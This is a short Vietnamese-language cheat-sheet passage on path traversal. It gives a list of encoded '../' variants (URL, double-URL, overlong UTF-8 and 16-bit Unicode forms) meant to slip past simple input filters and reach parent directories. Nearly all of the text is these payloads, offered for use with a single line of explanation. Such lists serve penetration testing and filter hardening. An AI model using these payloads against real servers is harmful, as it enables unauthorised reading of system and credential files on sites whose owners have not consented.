## Basic exploitation ##
Sử dụng chuỗi ký tự `../` để truy cập thư mục cha. Một số cách bypass những filter đơn giản:
```
../
..\
..\/
.././
%2e%2e%2f
%252e%252e%252f
%c0%ae%c0%ae%c0%af
%uff0e%uff0e%u2215
%uff0e%uff0e%u2216
```
16 bits Unicode encoding
```
. = %u002e
/ = %u2215
\ = %u2216
```
UTF-8 Unicode encoding
```
. = %c0%2e, %e0%40%ae, %c0ae
/ = %c0%af, %e0%80%af, %c0%2f
\ = %c0%5c, %c0%80%5c
```
